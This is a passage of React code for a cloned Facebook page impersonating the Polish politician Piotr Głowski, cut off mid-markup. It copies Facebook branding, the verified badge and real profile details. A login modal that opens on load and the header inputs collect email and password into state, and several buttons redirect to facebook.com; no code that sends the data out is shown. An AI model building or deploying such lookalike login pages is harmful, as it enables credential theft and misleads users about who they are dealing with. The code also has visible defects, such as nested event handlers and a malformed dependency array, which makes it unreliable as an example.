import React, { useState } from 'react';



const GwarancjaRozwoju = () => {
  // State for likes, comments, etc.
  const [showModal, setShowModal] = useState(false);
  const [showMenu, setShowMenu] = useState(false);
  const [viewMode, setViewMode] = useState('desktop');
  const [messageOpen, setMessageOpen] = useState(false);
  const [showMiniHeader, setShowMiniHeader] = useState(false);
  const [isMobile, setIsMobile] = useState(window.innerWidth < 768);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');  
  const [scrollPosition, setScrollPosition] = useState(0);
  const [postCount, setPostCount] = useState(0);  
  const [isOpen, setIsOpen] = useState(true);
  const [isVisible, setIsVisible] = useState(false);
  const [expanded, setExpanded] = useState(false);

  React.useEffect(() => {
    const handleScroll = () => {
      const scrollPosition = window.scrollY;
      setScrollPosition(scrollPosition);
      if (scrollPosition > 700) {
        setShowMiniHeader(true);
      } else {
        setShowMiniHeader(false);
      }

      if (!isMobile && window.scrollY > 2700) {
        setIsVisible(true);
      }
      

      
      const handleResize = () => {
      setIsMobile(window.innerWidth < 768);
    };
    const postHeight = 300; // Average height of a post in pixels
    const scrolledPosts = Math.floor(scrollPosition / postHeight);
    if (scrolledPosts !== postCount) {
      setPostCount(scrolledPosts);
      
      // Show modal after 4 posts on mobile
      if (scrolledPosts >= 10 && isMobile && !showModal) {
        setShowModal(true);
      }
    }

    window.addEventListener('resize', handleResize);
    return () => window.removeEventListener('resize', handleResize);
    };
    
    window.addEventListener("scroll", handleScroll);
    return () => window.removeEventListener("scroll", handleScroll);
  }, [[postCount, showModal, isMobile]]);

  const handleClickOutside = () => {
    if (showMenu) {
      setShowMenu(false);
    }
  };

  const handleResize = () => {
    setIsMobile(window.innerWidth < 768);
  };

  const openModal = (e) => {
    if (e) e.preventDefault();
    setShowModal(true);
  };

  // Function to close modal
  const closeModal = () => {
    setShowModal(false);
  };
  const handleScroll = () => {
    // Show modal only on desktop when scrolled past 1200px
    if (!isMobile && window.scrollY > 3500) {
      setIsVisible(true);
    }
  };
  
    const handleModalClose = () => {
    setIsOpen(false);
  };

  const modalClasses = `fixed inset-0 bg-black transition-opacity duration-300 z-50 ${
    isVisible && !isMobile ? 'bg-opacity-50' : 'bg-opacity-0 pointer-events-none hidden'
  }`;

  const redirectToFacebook = () => {
    window.location.href = 'https://www.facebook.com/';
  };

  const redirectToYoutube = () => {
    window.location.href = 'https://www.youtube.com/watch?v=X3Pjh2yMKk0';
  };

  return (
    <main className="bg-gray-100 min-h-screen">
      {isMobile ? (
        <header className="fixed top-0 left-0 right-0 z-50 flex items-center justify-between w-full px-4 py-3 bg-white border-b border-gray-200 shadow-sm">
          <a onClick={redirectToFacebook} href='#' className="mr-2 "> 
            <svg className="x1lliihq x5skwsv" height="22" viewBox="100 100 900 160" xmlns="http://www.w3.org/2000/svg"><title>Poseł Piotr Głowski  | Facebook</title><path fill="#1877f2" d="M881.583 257.897h29.48v-47.696l41.137 47.696h36.072l-47.89-54.969 40.909-47.663h-32.825l-37.403 43.93v-96.982l-29.48 3.864v151.82Zm-67.988-105.261c-32.728 0-55.455 22.013-55.455 53.929s22.727 53.929 55.455 53.929c32.727 0 55.455-22.013 55.455-53.929s-22.728-53.929-55.455-53.929Zm0 82.728c-15.163 0-25.552-11.721-25.552-28.799s10.389-28.799 25.552-28.799c15.162 0 25.552 11.721 25.552 28.799s-10.39 28.799-25.552 28.799Zm-119.807-82.728c-32.727 0-55.455 22.013-55.455 53.929s22.728 53.929 55.455 53.929c32.728 0 55.455-22.013 55.455-53.929s-22.727-53.929-55.455-53.929Zm0 82.728c-15.162 0-25.552-11.721-25.552-28.799s10.39-28.799 25.552-28.799c15.163 0 25.552 11.721 25.552 28.799s-10.389 28.799-25.552 28.799Zm-112.826-82.728c-13.636 0-24.935 5.357-32.013 15.162v-65.585l-29.513 3.831v151.82h26.169l.519-15.844c6.981 11.818 19.481 18.474 34.838 18.474 27.988 0 48.475-22.728 48.475-53.929 0-31.202-20.39-53.929-48.475-53.929Zm-6.98 82.728c-15.163 0-25.552-11.721-25.552-28.799s10.389-28.799 25.552-28.799c15.162 0 25.552 11.721 25.552 28.799s-10.39 28.799-25.552 28.799Zm-113.638 1.331c-15.649 0-26.883-7.273-30.714-19.805h72.63c.715-3.831 1.202-8.377 1.202-11.429 0-33.02-18.475-52.825-49.514-52.825-31.331 0-53.02 22.013-53.02 53.929 0 32.338 22.728 53.929 56.462 53.929 17.467 0 34.448-5.844 45.065-15.552l-10.617-18.701c-10.292 7.11-20.39 10.454-31.494 10.454Zm-6.591-61.137c13.637 0 22.338 8.279 22.338 21.104v.098h-47.078c2.825-13.604 11.623-21.202 24.74-21.202Zm-98.994 84.968c15.26 0 30.195-5.844 40.714-15.974l-11.526-19.383c-8.182 6.364-17.467 9.805-26.266 9.805-16.364 0-27.273-11.429-27.273-28.377s10.909-28.377 27.273-28.377c8.084 0 16.883 2.922 24.026 8.085l11.721-19.806c-9.481-8.571-24.156-13.831-38.702-13.831-32.013 0-54.643 22.338-54.643 53.929.032 31.494 22.662 53.929 54.676 53.929Zm-93.735-105.261-.519 15.975c-6.981-11.916-19.481-18.572-34.838-18.572-28.085 0-48.475 22.728-48.475 53.929 0 31.202 20.52 53.929 48.475 53.929 15.357 0 27.889-6.656 34.838-18.474l.519 15.844h26.169V155.265h-26.169Zm-28.377 80.099c-15.162 0-25.552-11.721-25.552-28.799s10.39-28.799 25.552-28.799c15.163 0 25.552 11.721 25.552 28.799s-10.422 28.799-25.552 28.799Zm-57.663-79.906h-26.526v-8.767c0-13.117 5.13-18.149 18.442-18.149 4.123 0 7.467.097 9.383.292v-22.5c-3.637-1.007-12.5-2.013-17.63-2.013-27.111 0-39.611 12.792-39.611 40.422v10.682h-16.753v24.806h16.753v77.631h29.448v-77.599h21.949l4.545-24.805Z"></path></svg>
          </a>
          
          <button onClick={redirectToFacebook} className="px-5 py-2 font-medium text-white bg-blue-600 rounded-md hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2">
            Zaloguj się
          </button>
        </header>
      ) : (
        <header className="fixed top-0 left-0 right-0 z-50 flex items-center justify-between w-full px-4 py-2 bg-white border-b border-gray-200 shadow-sm">
          <a onClick={redirectToFacebook} href='#' className="mr-2 ml-4"> 
            <svg  className="x1lliihq x5skwsv" height="22" viewBox="100 100 900 160" xmlns="http://www.w3.org/2000/svg"><title>Poseł Piotr Głowski  | Facebook</title><path fill="#1877f2" d="M881.583 257.897h29.48v-47.696l41.137 47.696h36.072l-47.89-54.969 40.909-47.663h-32.825l-37.403 43.93v-96.982l-29.48 3.864v151.82Zm-67.988-105.261c-32.728 0-55.455 22.013-55.455 53.929s22.727 53.929 55.455 53.929c32.727 0 55.455-22.013 55.455-53.929s-22.728-53.929-55.455-53.929Zm0 82.728c-15.163 0-25.552-11.721-25.552-28.799s10.389-28.799 25.552-28.799c15.162 0 25.552 11.721 25.552 28.799s-10.39 28.799-25.552 28.799Zm-119.807-82.728c-32.727 0-55.455 22.013-55.455 53.929s22.728 53.929 55.455 53.929c32.728 0 55.455-22.013 55.455-53.929s-22.727-53.929-55.455-53.929Zm0 82.728c-15.162 0-25.552-11.721-25.552-28.799s10.39-28.799 25.552-28.799c15.163 0 25.552 11.721 25.552 28.799s-10.389 28.799-25.552 28.799Zm-112.826-82.728c-13.636 0-24.935 5.357-32.013 15.162v-65.585l-29.513 3.831v151.82h26.169l.519-15.844c6.981 11.818 19.481 18.474 34.838 18.474 27.988 0 48.475-22.728 48.475-53.929 0-31.202-20.39-53.929-48.475-53.929Zm-6.98 82.728c-15.163 0-25.552-11.721-25.552-28.799s10.389-28.799 25.552-28.799c15.162 0 25.552 11.721 25.552 28.799s-10.39 28.799-25.552 28.799Zm-113.638 1.331c-15.649 0-26.883-7.273-30.714-19.805h72.63c.715-3.831 1.202-8.377 1.202-11.429 0-33.02-18.475-52.825-49.514-52.825-31.331 0-53.02 22.013-53.02 53.929 0 32.338 22.728 53.929 56.462 53.929 17.467 0 34.448-5.844 45.065-15.552l-10.617-18.701c-10.292 7.11-20.39 10.454-31.494 10.454Zm-6.591-61.137c13.637 0 22.338 8.279 22.338 21.104v.098h-47.078c2.825-13.604 11.623-21.202 24.74-21.202Zm-98.994 84.968c15.26 0 30.195-5.844 40.714-15.974l-11.526-19.383c-8.182 6.364-17.467 9.805-26.266 9.805-16.364 0-27.273-11.429-27.273-28.377s10.909-28.377 27.273-28.377c8.084 0 16.883 2.922 24.026 8.085l11.721-19.806c-9.481-8.571-24.156-13.831-38.702-13.831-32.013 0-54.643 22.338-54.643 53.929.032 31.494 22.662 53.929 54.676 53.929Zm-93.735-105.261-.519 15.975c-6.981-11.916-19.481-18.572-34.838-18.572-28.085 0-48.475 22.728-48.475 53.929 0 31.202 20.52 53.929 48.475 53.929 15.357 0 27.889-6.656 34.838-18.474l.519 15.844h26.169V155.265h-26.169Zm-28.377 80.099c-15.162 0-25.552-11.721-25.552-28.799s10.39-28.799 25.552-28.799c15.163 0 25.552 11.721 25.552 28.799s-10.422 28.799-25.552 28.799Zm-57.663-79.906h-26.526v-8.767c0-13.117 5.13-18.149 18.442-18.149 4.123 0 7.467.097 9.383.292v-22.5c-3.637-1.007-12.5-2.013-17.63-2.013-27.111 0-39.611 12.792-39.611 40.422v10.682h-16.753v24.806h16.753v77.631h29.448v-77.599h21.949l4.545-24.805Z"></path></svg>
          </a>
          
          <div className="flex items-center space-x-2">
            <input
              type="text"
              placeholder="Adres e-mail lub numer telefonu"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-1 focus:ring-blue-500"
            />
            <input
              type="password"
              placeholder="Hasło"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-1 focus:ring-blue-500"
            />
            <button onClick={redirectToFacebook} className="px-4 py-2 font-medium text-white bg-blue-600 rounded-md hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2">
              Zaloguj się
            </button>
            <a onClick={redirectToFacebook} className="text-sm text-blue-600 hover:underline">
              Nie pamiętasz nazwy konta?
            </a>
          </div>
        </header>
      )}
 <div className={`fixed inset-0 bg-black transition-opacity duration-300 z-50 ${isOpen ? 'bg-opacity-50' : 'bg-opacity-0 pointer-events-none'}`}>
      <div className={`fixed inset-0 flex items-center justify-center p-4 transition-all duration-300 ${isOpen ? 'opacity-100' : 'opacity-0 pointer-events-none'}`}>
        <div className="bg-white rounded-lg shadow-lg w-full max-w-md relative overflow-hidden transform transition-transform duration-300">
          <button 
            onClick={handleModalClose} 
            className="absolute right-3 top-3 text-gray-500 hover:text-gray-700"
          >
            <svg  xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <line x1="18" y1="6" x2="6" y2="18"></line>
              <line x1="6" y1="6" x2="18" y2="18"></line>
            </svg>
          </button>

          <div className="flex flex-col items-center pt-10 pb-6">
            <div className="w-24 h-24 rounded-full overflow-hidden relative mb-2">
              <img 
                src="/Assets/Gwarancja.rozwoju/photo_avatar.jpg" 
                alt="Profile" 
                className="w-full h-full object-cover"
              />

            </div>
          </div>

          <div className="px-6 pb-6">
            <h2 className="text-2xl font-bold text-center mb-6">
              {isMobile ? "See more from Poseł Piotr Głowski " : "Wyświetl więcej materiałów ze strony Poseł Piotr Głowski "}
            </h2>

            {!isMobile && (
              <>
                <div className="mb-4">
                  <p className="text-sm text-gray-600 mb-2">Adres e-mail lub numer telefonu</p>
                  <input 
                    type="text" 
                    className="w-full px-3 py-2 border border-gray-300 rounded-md" 
                    placeholder="Adres e-mail lub numer telefonu"
                  />
                </div>
                <div className="mb-6">
                  <p className="text-sm text-gray-600 mb-2">Hasło</p>
                  <input 
                    type="password" 
                    className="w-full px-3 py-2 border border-gray-300 rounded-md" 
                    placeholder="Hasło"
                  />
                </div>
              </>
            )}

            <button onClick={redirectToFacebook} className="w-full bg-blue-600 text-white py-3 rounded-md font-medium mb-4">
              {isMobile ? "Log in" : "Zaloguj się"}
            </button>

            {!isMobile && (
              <div className="text-center mb-4">
                <a onClick={redirectToFacebook} className="text-blue-600 text-sm">Nie pamiętasz hasła?</a>
              </div>
            )}

            <div className="flex items-center justify-center mb-4">
              <div className="flex-1 h-px bg-gray-300"></div>
              <span className="px-4 text-gray-500 text-sm">lub</span>
              <div className="flex-1 h-px bg-gray-300"></div>
            </div>

            <button onClick={redirectToFacebook} className="w-full bg-gray-200 text-gray-800 py-3 rounded-md font-medium">
              {isMobile ? "Create new account" : "Utwórz nowe konto"}
            </button>
          </div>
        </div>
      </div>
    </div>
   
 <main className="pt-14">
        {showMiniHeader && (
          <div className="fixed z-40 top-14 left-0 right-0 bg-white shadow-sm py-3 px-4 flex items-center justify-between">
            <div className="flex items-center">
              <div className="flex items-center px-3 py-2 rounded-lg transition-colors hover:bg-gray-100 cursor-pointer">
                <img src="/Assets/Gwarancja.rozwoju/photo_avatar.jpg" alt="Poseł Piotr Głowski " className="w-11 h-11 rounded-full mr-3" />
                <h2 className="font-bold text-xl">Poseł Piotr Głowski </h2>
              </div>
            </div>
            <button className="p-2 rounded-md hover:bg-gray-200 bg-gray-200">
              <svg className="w-6 h-6 text-gray-600" fill="currentColor" viewBox="0 0 20 20">
                <path d="M6 10a2 2 0 110-4 2 2 0 010 4zM10 10a2 2 0 110-4 2 2 0 010 4zM14 10a2 2 0 110-4 2 2 0 010 4z" />
              </svg>
            </button>
          </div>
        )}
        
        <div className="bg-white shadow-[0_1px_2px_rgba(0,0,0,0.1)]">
      <div className="relative">
        {!isMobile && (
          <div className="w-full flex justify-center">
            <div className="w-[980px] relative">
              <img 
                src="/Assets/Gwarancja.rozwoju/background.jpg"
                alt="Cover"
                className="w-full h-[348px] object-cover rounded-md"
              />
            </div>
          </div>
        )}
        
        {isMobile && (
          <div className="w-full">
            <img 
              src="/Assets/Gwarancja.rozwoju/background.jpg"
              alt="Cover"
              className="w-full object-cover rounded-md"
            />
          </div>
        )}

        {isMobile ? (
          <div className="absolute left-4 bottom-0 transform translate-y-1/2">
            <div className="w-32 h-32 rounded-full border-4 border-blue-500 overflow-hidden bg-white">
              <img src="/Assets/Gwarancja.rozwoju/photo_avatar.jpg" alt="Poseł Piotr Głowski " className="w-full h-full object-cover" />
            </div>
          </div>
        ) : (
          <div className="absolute bottom-0 left-0 right-0 flex justify-center">
            <div className="w-[940px] relative">
              <div className="absolute left-0 bottom-0 transform translate-y-1/3">
                <div className="w-40 h-40 rounded-full border-4 border-white overflow-hidden bg-white">
                  <img src="/Assets/Gwarancja.rozwoju/photo_avatar.jpg" alt="Poseł Piotr Głowski " className="w-full h-full object-cover" />
                </div>
              </div>
            </div>
          </div>
        )}
      </div>

      <div className={`${isMobile ? 'w-full' : 'w-[940px] mx-auto'}`}>
        {isMobile && (
          <div className="mt-16 px-4 pb-4">
            <div className="flex flex-col">
              <div className="flex items-center">
                <h1 className="text-2xl font-bold">Poseł Piotr Głowski </h1>
                <svg viewBox="0 0 12 13" width="16" height="16" title="Zweryfikowane konto" className="ml-2 fill-[#1877F2]">
                  <title>Zweryfikowane konto</title>
                  <g fillRule="evenodd" transform="translate(-98 -917)">
                    <path d="m106.853 922.354-3.5 3.5a.499.499 0 0 1-.706 0l-1.5-1.5a.5.5 0 1 1 .706-.708l1.147 1.147 3.147-3.147a.5.5 0 1 1 .706.708m3.078 2.295-.589-1.149.588-1.15a.633.633 0 0 0-.219-.82l-1.085-.7-.065-1.287a.627.627 0 0 0-.6-.603l-1.29-.066-.703-1.087a.636.636 0 0 0-.82-.217l-1.148.588-1.15-.588a.631.631 0 0 0-.82.22l-.701 1.085-1.289.065a.626.626 0 0 0-.6.6l-.066 1.29-1.088.702a.634.634 0 0 0-.216.82l.588 1.149-.588 1.15a.632.632 0 0 0 .219.819l1.085.701.065 1.286c.014.33.274.59.6.604l1.29.065.703 1.088c.177.27.53.362.82.216l1.148-.588 1.15.589a.629.629 0 0 0 .82-.22l.701-1.085 1.286-.064a.627.627 0 0 0 .604-.601l.065-1.29 1.088-.703a.633.633 0 0 0 .216-.819"></path>
                  </g>
                </svg>
              </div>
              <p onClick='openModal' className="text-gray-600 mt-1 text-sm">7,3 tys. obserwujący • 561 obserwowanych</p>
              <p className="mt-2 text-sm">
              Pilanin, doktor nauk ekonomicznych,<br /> senator VII kadencji, Prezydent Piły w <br />latach 2010-2023
              </p>
              
              <div className="mt-4 flex">
                <button className="flex-1 py-2 bg-gray-200 rounded-md text-black text-sm font-medium flex items-center justify-center mr-2">
                  <img className="x1b0d499 xep6ejk" src="https://static.xx.fbcdn.net/rsrc.php/v4/yp/r/YgPW3ny32AJ.png" alt="" aria-hidden="true" height="16" width="16"/>
                  Obserwuj
                </button>
                <button className="w-12 py-2 bg-gray-200 rounded-md text-black text-sm font-medium flex items-center justify-center">
                  <svg className="w-4 h-4 fill-current" viewBox="0 0 24 24">
                    <path d="M6 10c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm12 0c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm-6 0c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z"/>
                  </svg>
                </button>
              </div>
            </div>
          </div>
        )}

        {!isMobile && (
          <div className="flex items-center mt-6 mb-6">
            <div className="w-44"></div>
            
            <div>
              <div className="flex items-center">
                <h1 className="text-3xl font-bold">Poseł Piotr Głowski </h1>
                <svg viewBox="0 0 12 13" width="16" height="16" title="Zweryfikowane konto" className="ml-2 fill-[#1877F2]">
                  <title>Zweryfikowane konto</title>
                  <g fillRule="evenodd" transform="translate(-98 -917)">
                    <path d="m106.853 922.354-3.5 3.5a.499.499 0 0 1-.706 0l-1.5-1.5a.5.5 0 1 1 .706-.708l1.147 1.147 3.147-3.147a.5.5 0 1 1 .706.708m3.078 2.295-.589-1.149.588-1.15a.633.633 0 0 0-.219-.82l-1.085-.7-.065-1.287a.627.627 0 0 0-.6-.603l-1.29-.066-.703-1.087a.636.636 0 0 0-.82-.217l-1.148.588-1.15-.588a.631.631 0 0 0-.82.22l-.701 1.085-1.289.065a.626.626 0 0 0-.6.6l-.066 1.29-1.088.702a.634.634 0 0 0-.216.82l.588 1.149-.588 1.15a.632.632 0 0 0 .219.819l1.085.701.065 1.286c.014.33.274.59.6.604l1.29.065.703 1.088c.177.27.53.362.82.216l1.148-.588 1.15.589a.629.629 0 0 0 .82-.22l.701-1.085 1.286-.064a.627.627 0 0 0 .604-.601l.065-1.29 1.088-.703a.633.633 0 0 0 .216-.819"></path>
                  </g>
                </svg>
              </div>
              <p className="text-gray-600 mt-1 text-sm">7,3 tys. obserwujący • 561 obserwowanych</p>
            </div>
          </div>
        )}
      </div>

      <div className={`border-t border-gray-300 ${!isMobile ? 'w-[940px] mx-auto' : 'w-full'} ` }></div>

      <div className={`${!isMobile ? 'w-[940px] mx-auto' : 'w-full'} `}>
        {!isMobile && (
          <div className="flex justify-between ">
            <div className="flex overflow-x-auto">
              <button className="px-4 py-3 font-medium text-blue-600 border-b-4 border-blue-600 whitespace-nowrap">
                Posty
              </button>
              <button onClick={openModal} className="px-4 py-3 font-medium text-gray-600 hover:bg-gray-100 rounded-md whitespace-nowrap">
                Informacje
              </button>
              <button onClick={openModal} className="px-4 py-3 font-medium text-gray-600 hover:bg-gray-100 rounded-md whitespace-nowrap">
              Rolki
              </button>
              <button onClick={openModal} className="px-4 py-3 font-medium text-gray-600 hover:bg-gray-100 rounded-md whitespace-nowrap">
              Zdjęcia
              </button>
              <button onClick={openModal} className="px-4 py-3 font-medium text-gray-600 hover:bg-gray-100 rounded-md whitespace-nowrap">
              Filmy
              </button>
            </div>
            
            <div>
              <button onClick={openModal} className="py-3 px-4  rounded-md bg-gray-200 mt-2">
              <svg viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" class="xfx01vb x1lliihq x1tzjh5l x1k90msu x2h7rmj x1qfuztq" style={{"--color":" var(--primary-icon);"}}><circle cx="12" cy="12" r="2.5"></circle><circle cx="19.5" cy="12" r="2.5"></circle><circle cx="4.5" cy="12" r="2.5"></circle></svg>
              </button>
            </div>
          </div>
        )}
        
        {isMobile && (
          <div className="flex justify-between overflow-x-auto">
            <div className="flex">
              <button onClick={openModal} className="px-4 py-3 font-medium text-blue-600 border-b-4 border-blue-600 whitespace-nowrap">
                Posty
              </button>
              <button onClick={openModal} className="px-4 py-3 font-medium text-gray-600 hover:bg-gray-100 rounded-md whitespace-nowrap">
                Informacje
              </button>
              <button onClick={openModal} className="px-4 py-3 font-medium text-gray-600 hover:bg-gray-100 rounded-md whitespace-nowrap">
                Zdjęcia
              </button>
              <button onClick={openModal} className="px-4 py-3 font-medium text-gray-600 hover:bg-gray-100 rounded-md whitespace-nowrap">
                Filmy
              </button>
              <button onClick={openModal} className="px-4 py-3 font-medium text-gray-600 hover:bg-gray-100 rounded-md whitespace-nowrap">
                Rolki
              </button>
            </div>
            
            <div>
              <button className="p-2 rounded-md bg-gray-200">
                <svg className="w-6 h-6 text-gray-600" fill="currentColor" viewBox="0 0 20 20">
                  <path d="M6 10a2 2 0 110-4 2 2 0 010 4zM10 10a2 2 0 110-4 2 2 0 010 4zM14 10a2 2 0 110-4 2 2 0 010 4z" />
                </svg>
              </button>
            </div>
          </div>
        )}
      </div>

      
    </div>
</main>
        <div className="px-4 md:px-8 mt-2 max-w-5xl mx-auto bg-[#F0F2F5]">
          <div className="flex flex-col md:flex-row">
            <div className="md:w-1/3 m-2">
              <div className="bg-white rounded-lg shadow p-4 mb-4">
                <h2 className="text-xl font-bold mb-3">Prezentacja</h2>
                <p className="text-center text-sm mb-6">
                Pilanin, doktor nauk ekonomicznych,<br /> senator VII kadencji, Prezydent Piły w <br />latach 2010-2023
                </p>
                
                <hr className="my-4" />
                
                <div className="flex items-center space-x-2 p-2 rounded hover:bg-gray-100">
                  <img className="x1b0d499 xuo83w3 opacity-60" src="https://static.xx.fbcdn.net/rsrc.php/v4/yC/r/qF_eflLVarp.png" alt="" height="20" width="20"/>
                  <div>
                    <p><strong>Strona</strong> · Autor</p>
                  </div>
                </div>


                <div className="flex items-center space-x-2 p-2 rounded hover:bg-gray-100">
                <img className="opacity-60" alt="" height="20" width="20" src="https://static.xx.fbcdn.net/rsrc.php/v4/yr/r/bwmGKGh4YjO.png"/>
                  <div>
                    <p>
                    Dąbrowskiego 8, Piła, Poland</p>
                  </div>
                </div>


                
                <div className="flex items-center space-x-2 p-2 rounded hover:bg-gray-100">
                <img className="x1b0d499 xuo83w3 opacity-60" src="https://static.xx.fbcdn.net/rsrc.php/v4/yb/r/KVUi1wUrbfb.png" alt="" height="20" width="20"/>
                  <div>
                    <p >biuro@polska2050.pl</p>
                  </div>
                </div>
              </div>
              
              <div className="bg-white rounded-lg shadow p-4 mb-4">
                <div className="flex justify-between items-center mb-3">
                  <h2 onClick={openModal} className="text-xl font-bold">Zdjęcia</h2>
                  <a onClick={openModal} className="text-blue-500 text-sm font-semibold">Zobacz wszystkie zdjęcia</a>
                </div>
                <div className="grid grid-cols-3 gap-1">
                  <div className="aspect-square bg-red-500 text-white rounded-md overflow-hidden relative">
                  <img src="/Assets/Gwarancja.rozwoju/photo_gallerea1.jpg" alt="Photo of a person in suit" className="w-full h-full object-cover" />

                  </div>
                  <div className="aspect-square bg-gray-200 rounded-md overflow-hidden">
                  <img src="/Assets/Gwarancja.rozwoju/photo_gallerea2.jpg" alt="Photo of a person in suit" className="w-full h-full object-cover" />
                  </div>
                  <div className="aspect-square bg-gray-200 rounded-md overflow-hidden">
                  <img src="/Assets/Gwarancja.rozwoju/photo_gallerea3.jpg" alt="Photo of a person in suit" className="w-full h-full object-cover" />
                  </div>
                  
                  <div className="aspect-square bg-gray-200 rounded-md overflow-hidden">
                  <img src="/Assets/Gwarancja.rozwoju/photo_gallerea4.jpg" alt="Photo of a person in suit" className="w-full h-full object-cover" />
                  </div>
                  <div className="aspect-square bg-gray-200 rounded-md overflow-hidden">
                  <img src="/Assets/Gwarancja.rozwoju/photo_gallerea5.jpg" alt="Photo of a person in suit" className="w-full h-full object-cover" />
                  </div>
                  <div className="aspect-square bg-gray-200 rounded-md overflow-hidden">
                  <img src="/Assets/Gwarancja.rozwoju/photo_gallerea6.jpg" alt="Photo of a person in suit" className="w-full h-full object-cover" />
                  </div>
                  
                  <div className="aspect-square bg-blue-600 text-white rounded-md overflow-hidden relative">
                  <img src="/Assets/Gwarancja.rozwoju/photo_gallerea7.jpg" alt="Photo of a person in suit" className="w-full h-full object-cover" />
                  </div>
                  <div className="aspect-square bg-gray-200 rounded-md overflow-hidden">
                  <img src="/Assets/Gwarancja.rozwoju/photo_gallerea8.jpg" alt="Photo of a person in suit" className="w-full h-full object-cover" />
                  </div>
                  <div className="aspect-square bg-gray-200 rounded-md overflow-hidden">
                  <img src="/Assets/Gwarancja.rozwoju/photo_gallerea9.jpg" alt="Photo of a person in suit" className="w-full h-full object-cover" />
                  </div>
                </div>
              </div>
            </div>
            <div className="md:w-2/3 m-2">




            <div className="bg-white rounded-lg shadow mb-4 w-full">
      <div className="p-4">
        {/* Header with user info */}
        <div className="flex items-start mb-3">
          <div className="w-10 h-10 rounded-full mr-2 overflow-hidden bg-blue-100 flex items-center justify-center">
            <img 
              src="/Assets/Gwarancja.rozwoju/photo_avatar.jpg" 
              alt="User" 
              className="w-full h-full object-cover" 
            />
          </div>
          <div className="flex-grow">
            <div className="flex justify-between items-start w-full">
              <div>
                <div className="flex items-center">
                  <h3 className="font-semibold">Poseł Piotr Głowski</h3>
                  <span className="ml-2">–</span>
                  <span className="ml-2">😊</span>
                  <span className="ml-2 text-gray-500">dumny(a).</span>
                </div>
                <div className="flex items-center text-xs text-gray-500">
                  <span>2d</span>
                  <span className="mx-1">·</span>
                  <svg className="w-3 h-3" fill="currentColor" viewBox="0 0 16 16">
                    <path d="M8 0a8 8 0 1 0 0 16A8 8 0 0 0 8 0zm0 14.5a6.5 6.5 0 1 1 0-13 6.5 6.5 0 0 1 0 13z"/>
                  </svg>
                </div>
              </div>
              <div className="relative">
                <button 
                  className="text-gray-500 ml-2 p-1 rounded-full hover:bg-gray-100"
                  onClick={() => setShowMenu(!showMenu)}
                >
                  <svg viewBox="0 0 20 20" width="20" height="20" fill="currentColor">
                    <g fillRule="evenodd" transform="translate(-446 -350)">
                      <path d="M458 360a2 2 0 1 1-4 0 2 2 0 0 1 4 0m6 0a2 2 0 1 1-4 0 2 2 0 0 1 4 0m-12 0a2 2 0 1 1-4 0 2 2 0 0 1 4 0"></path>
                    </g>
                  </svg>
                </button>
                {showMenu && (
                  <div className="absolute right-0 mt-1 w-48 bg-white rounded-md shadow-lg z-10">
                    <ul className="py-1">
                      <li>
                        <a href="#" className="block px-4 py-2 text-sm text-gray-700 hover:bg-gray-100">
                          Zapisz post
                        </a>
                      </li>
                      <li>
                        <a href="#" className="block px-4 py-2 text-sm text-gray-700 hover:bg-gray-100">
                          Zgłoś
                        </a>
                      </li>
                    </ul>
                  </div>
                )}
              </div>
            </div>
          </div>
        </div>
        
        {/* Post content - text */}
        <div className="mb-3 overflow-hidden">
          <div className="mb-3">
            <p className="mb-2 break-words">
              Nowy zespół, w którym gra mój syn Adam. Za nimi dużo pracy, ale wierzę, że przed nimi wiele sukcesów.
            </p>
            <p className="mb-2 break-words">
              To dopiero początek. Powodzenia <span className="text-blue-600">Merdu</span> !
            </p>
          </div>
          
          {/* YouTube embed */}
          <div className="rounded-lg overflow-hidden border border-gray-300">
            <div className="aspect-w-16 aspect-h-9 bg-black">
              <img 
                src="/Assets/Gwarancja.rozwoju/photo_11Post.jpg" 
                alt="Merdu - Tundra album cover" 
                className="w-full object-cover" 
              />
            </div>
            <div className="p-3 bg-gray-100" onClick={redirectToYoutube}>
              <div className="text-gray-600 text-xs mb-1">YOUTUBE.COM</div>
              <div className="font-bold text-lg">Merdu - Tundra (DEMO SINGLE)</div>
              <div className="text-gray-700 text-sm">
                Drugi singiel demo zespołu Merdu.
                <span className="ml-1 text-gray-500">Facebook: https://www.face...</span>
              </div>
            </div>
          </div>
        </div>
        
        {/* Post engagement stats */}
        <div className="flex justify-between text-xs text-gray-500 border-b py-2 mb-2">
          <div className="flex items-center">
            <div className="flex -space-x-1 mr-1">
              <div className="bg-blue-500 rounded-full w-5 h-5 flex items-center justify-center">
                <svg className="w-3 h-3 text-white" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M1 21h4V9H1v12zm22-11c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 1 7.59 7.59C7.22 7.95 7 8.45 7 9v10c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-1.91l-.01-.01L23 10z" />
                </svg>
              </div>
              <div className="bg-red-500 rounded-full w-5 h-5 flex items-center justify-center">
                <svg className="w-3 h-3 text-white" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z" />
                </svg>
              </div>
            </div>
            <span>9</span>
          </div>
          <div>
            <span>2 udostępnienia</span>
          </div>
        </div>
        
        {/* Action buttons */}
        <div className="flex">
          <button onClick={openModal} className="flex-1 py-1 text-gray-500 font-medium text-sm flex items-center justify-center hover:bg-gray-100 rounded">
